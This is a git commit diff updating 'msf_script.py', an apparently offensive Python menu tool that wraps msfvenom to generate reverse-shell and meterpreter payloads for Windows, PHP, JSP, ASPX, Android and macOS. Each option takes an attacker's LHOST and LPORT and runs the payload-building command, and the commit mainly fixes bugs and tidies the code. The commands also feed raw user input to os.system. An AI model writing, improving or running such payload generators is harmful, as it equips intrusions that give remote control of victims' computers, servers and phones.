b0687113dfbaaa5d5687cbc7bdb8c240844f7ca4
건우Sec <madanokr002@gmail.com>
2024-10-05 16:08:32 +0900

    Update msf_script.py

--- PROJECT/Tools/msf_script.py
+++ PROJECT/Tools/msf_script.py
@@ -20,7 +20,7 @@ class TextColors:
 
 def msfvenom():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(TextColors.CRIMSON +"""
+    print(TextColors.CRIMSON + """
  ███▄ ▄███▓  ██████   █████▒██▒   █▓▓█████  ███▄    █  ▒█████   ███▄ ▄███▓
 ▓██▒▀█▀ ██▒▒██    ▒ ▓██   ▒▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒
 ▓██    ▓██░░ ▓██▄   ▒████ ░ ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░
@@ -31,78 +31,73 @@ def msfvenom():
 ░      ░   ░  ░  ░   ░ ░        ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
        ░         ░               ░     ░  ░         ░     ░ ░         ░   
                                 ░                                         
-                                ░                                                                                                                             
+
 -- version 1.0 -- 
 -- enjoy --
 -- :) --
 
 [1] UPDATE MSFVENOM       [6] ANDROID REVERSE_TCP                              
 [2] REVERSE_TCP           [7] MACOS REVERSE_TCP         
-[3] PHP                   
-[4] JSP
+[3] PHP                    [4] JSP
 [5] ASPX
-          
           """)
 
     while True:
-
         select = input(TextColors.CRIMSON + "AKIRA > " + TextColors.ESET)
 
-        if select == "1" or select == "1":
-            os.system(f"msfupdate")
+        if select == "1":
+            os.system("msfupdate")
                 
-        if select == "2" or select == "2":
-            LHOST = input(TextColors.CRIMSON + "ENTER THE LHOST : "+ TextColors.ESET)
-            LPORT = input(TextColors.CRIMSON + "ENTER THE LPORT : "+ TextColors.ESET)
-            NAME = input(TextColors.CRIMSON + "ENTER THE PAYLOAD NAME (exe) : "+ TextColors.ESET)
+        if select == "2":
+            LHOST = input(TextColors.CRIMSON + "ENTER THE LHOST : " + TextColors.ESET)
+            LPORT = input(TextColors.CRIMSON + "ENTER THE LPORT : " + TextColors.ESET)
+            NAME = input(TextColors.CRIMSON + "ENTER THE PAYLOAD NAME (exe) : " + TextColors.ESET)
 
-            commnad = os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o {NAME}")
-            os.system(commnad)
-            print(TextColors.CYAN + f"[+] SUCCESSFULLY EXECUTED : ")
+            command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o {NAME}"
+            os.system(command)
+            print(TextColors.CYAN + f"[+] SUCCESSFULLY EXECUTED : {NAME}")
                 
-        if select == "3" or select == "3":
+        if select == "3":
             LHOST = input("ENTER THE LHOST : ")
             LPORT = input("ENTER THE LPORT : ")
             NAME = input("ENTER THE PAYLOAD NAME (.php) : ")
 
-            commnad = os.system(f"msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -o {NAME}")
-            os.system(commnad)
-            print(f"[+] SUCCESSFULLY EXECUTED : ")  
+            command = f"msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -o {NAME}"
+            os.system(command)
+            print(f"[+] SUCCESSFULLY EXECUTED : {NAME}")  
 
-        if select == "4" or select == "4":
+        if select == "4":
             LHOST = input("ENTER THE LHOST : ")
             LPORT = input("ENTER THE LPORT : ")
             NAME = input("ENTER THE PAYLOAD NAME (.jsp) : ")
 
-            commnad = os.system(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o {NAME}")
-            os.system(commnad)
-            print(f"[+] SUCCESSFULLY EXECUTED : ")
+            command = f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o {NAME}"
+            os.system(command)
+            print(f"[+] SUCCESSFULLY EXECUTED : {NAME}")
                          
-        if select == "5" or select == "5":
+        if select == "5":
             LHOST = input("ENTER THE LHOST : ")
             LPORT = input("ENTER THE LPORT : ")
             NAME = input("ENTER THE PAYLOAD NAME (.aspx) : ")
 
-            commnad = os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o {NAME}")
-            os.system(commnad)
-            print(f"[+] SUCCESSFULLY EXECUTED : ")
+            command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o {NAME}"
+            os.system(command)
+            print(f"[+] SUCCESSFULLY EXECUTED : {NAME}")
                            
-        if select == "6" or select == "6":
+        if select == "6":
             LHOST = input("ENTER THE LHOST : ")
             LPORT = input("ENTER THE LPORT : ")
             NAME = input("ENTER THE PAYLOAD NAME (.apk) : ")
 
-            commnad = os.system(f"msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={LHOST} lport={LPORT} R -o {NAME}")
-            os.system(commnad)
-            print(f"[+] SUCCESSFULLY EXECUTED : ")
+            command = f"msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o {NAME}"
+            os.system(command)
+            print(f"[+] SUCCESSFULLY EXECUTED : {NAME}")
 
-        
-        if select == "7" or select == "7":
+        if select == "7":
             LHOST = input("ENTER THE LHOST : ")
             LPORT = input("ENTER THE LPORT : ")
             NAME = input("ENTER THE PAYLOAD NAME (.macho) : ")
 
-            commnad = os.system(f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o {NAME}")
-            os.system(commnad)
-            print(f"[+] SUCCESSFULLY EXECUTED : ")
-
+            command = f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o {NAME}"
+            os.system(command)
+            print(f"[+] SUCCESSFULLY EXECUTED : {NAME}")
